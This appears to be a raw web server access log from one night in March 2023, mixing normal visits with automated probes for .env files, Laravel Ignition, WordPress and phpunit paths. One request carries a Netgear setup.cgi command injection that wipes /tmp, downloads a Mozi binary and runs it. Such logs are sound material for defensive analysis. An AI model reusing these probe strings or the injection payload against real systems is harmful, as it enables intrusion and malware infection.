51.79.29.48 - - [16/Mar/2023:01:07:42 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:01:07:42 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
176.9.151.21 - - [16/Mar/2023:01:15:07 +0000] "GET /.well-known/acme-challenge/ZNPGTS50GBOB-7-C7YCXBQQID74ZR1SR HTTP/1.1" 404 437 "-" "Cpanel-HTTP-Client/1.0"
176.9.151.21 - - [16/Mar/2023:01:15:22 +0000] "GET /.well-known/acme-challenge/MHHAUXUO2XYIFACT58O5BJVXS_38W03X HTTP/1.1" 404 1762 "-" "Cpanel-HTTP-Client/1.0"
143.110.222.166 - - [16/Mar/2023:01:17:48 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.79.29.48 - - [16/Mar/2023:01:25:42 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:01:25:43 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.79.162.186 - - [16/Mar/2023:01:28:21 +0000] "GET / HTTP/1.1" 200 3511 "-" "python-requests/2.28.2"
51.79.29.48 - - [16/Mar/2023:01:55:04 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:01:55:05 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.77.167.139 - - [16/Mar/2023:02:22:36 +0000] "GET / HTTP/1.1" 200 3170 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
23.94.255.80 - - [16/Mar/2023:02:30:21 +0000] "GET / HTTP/1.1" 200 8452 "-" "-"
193.32.162.159 - - [16/Mar/2023:02:32:17 +0000] "GET / HTTP/1.1" 200 3511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.9.28.187 - - [16/Mar/2023:02:33:18 +0000] "GET / HTTP/1.1" 200 43012 "-" "python-requests/2.28.2"
109.237.96.124 - - [16/Mar/2023:02:46:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:56 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:56 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:57 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:58 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:58 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:46:59 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:00 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:00 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:01 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:02 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:02 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:03 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:04 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:04 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:05 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:05 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.96.124 - - [16/Mar/2023:02:47:06 +0000] "POST /_ignition/execute-solution HTTP/1.1" 403 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.181.104 - - [16/Mar/2023:02:47:15 +0000] "\x16\x03\x01" 400 500 "-" "-"
51.79.29.48 - - [16/Mar/2023:03:04:23 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:03:04:24 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [16/Mar/2023:03:15:02 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
187.149.48.121 - - [16/Mar/2023:03:19:24 +0000] "GET / HTTP/1.1" 200 8508 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:24 +0000] "GET /wp-includes/ID3/license.txt HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:25 +0000] "GET /feed/ HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:27 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:27 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:30 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:31 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:31 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:32 +0000] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:36 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:36 +0000] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:37 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:38 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:39 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:40 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
187.149.48.121 - - [16/Mar/2023:03:19:43 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:19 +0000] "HEAD / HTTP/1.0" 200 1105 "-" "-"
209.97.162.220 - - [16/Mar/2023:03:28:19 +0000] "GET /system_api.php HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:20 +0000] "GET /c/version.js HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:20 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:20 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:21 +0000] "GET /stream/live.php HTTP/1.1" 404 1762 "-" "AlexaMediaPlayer/2.1.4676.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.9"
209.97.162.220 - - [16/Mar/2023:03:28:21 +0000] "GET /flu/403.html HTTP/1.1" 404 1762 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.97.162.220 - - [16/Mar/2023:03:28:21 +0000] "GET / HTTP/1.1" 200 3511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
35.205.96.143 - - [16/Mar/2023:03:32:43 +0000] "GET / HTTP/1.1" 200 8082 "-" "python-requests/2.28.2"
51.79.29.48 - - [16/Mar/2023:03:47:18 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:03:47:19 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.72.78.73 - - [16/Mar/2023:03:52:34 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1762 "-" "-"
143.110.222.166 - - [16/Mar/2023:04:03:02 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
36.40.72.66 - - [16/Mar/2023:04:11:50 +0000] "GET / HTTP/1.1" 200 3474 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [16/Mar/2023:04:13:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 1762 "http://164.92.68.156:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
74.235.171.40 - - [16/Mar/2023:04:14:13 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
74.235.171.40 - - [16/Mar/2023:04:14:16 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 1762 "-" "python-requests/2.28.2"
176.9.151.21 - - [16/Mar/2023:04:16:16 +0000] "GET /.well-known/acme-challenge/DTZ911_5JLDCXXKX3UJ4ICZOCLT9T44V HTTP/1.1" 404 437 "-" "Cpanel-HTTP-Client/1.0"
176.9.151.21 - - [16/Mar/2023:04:16:32 +0000] "GET /.well-known/acme-challenge/LW9CMX0ICMJOBIQ---EK87-E3OV_OARD HTTP/1.1" 404 1762 "-" "Cpanel-HTTP-Client/1.0"
94.102.51.9 - - [16/Mar/2023:04:28:05 +0000] "GET / HTTP/1.0" 200 8458 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
77.28.114.153 - - [16/Mar/2023:04:41:16 +0000] "GET / HTTP/1.1" 200 8452 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
172.105.128.11 - - [16/Mar/2023:04:50:21 +0000] "\x16\x03\x01" 400 500 "-" "-"
193.32.162.159 - - [16/Mar/2023:04:55:11 +0000] "GET / HTTP/1.1" 200 3511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [16/Mar/2023:05:09:28 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.79.29.48 - - [16/Mar/2023:05:15:50 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:05:15:50 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Mar/2023:05:32:38 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:05:47:19 +0000] "POST / HTTP/1.1" 405 567988 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [16/Mar/2023:05:47:20 +0000] "GET /.env HTTP/1.1" 200 2069 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [16/Mar/2023:06:08:35 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
